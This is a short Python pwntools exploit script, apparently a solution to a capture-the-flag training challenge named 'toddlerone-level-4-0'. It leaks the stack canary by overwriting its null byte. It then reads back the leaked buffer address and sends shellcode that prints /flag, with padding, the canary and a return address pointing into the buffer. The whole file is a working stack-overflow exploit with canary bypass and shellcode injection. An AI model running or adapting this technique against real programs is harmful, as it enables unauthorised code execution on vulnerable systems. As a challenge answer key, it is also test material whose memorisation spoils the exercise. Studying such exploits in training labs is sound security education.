#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-4-0')
p = elf.process()

delta_len = 104
canary_dist = delta_len - 16 - len('REPEAT')
bytestream = b'REPEAT' + b'A' * canary_dist + b'X'

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)

#0x7adaa12e5a2e0777

p.recvuntil(b'X')
canary = p64(u64(p.recv(7).rjust(8, b'\x00')))

p.recvuntil(b'The input buffer begins at 0x')
addr = p.recvuntil(b',').decode()[:-1]
buffer_addr = p64(int(addr, 16))

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

canary_dist = delta_len - 16
padding = b'A' * (canary_dist - len(shellcode) - 8)
bytestream = shellcode + padding + p64(0x7adaa12e5a2e0777) + canary + b'A' * 8 + buffer_addr

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
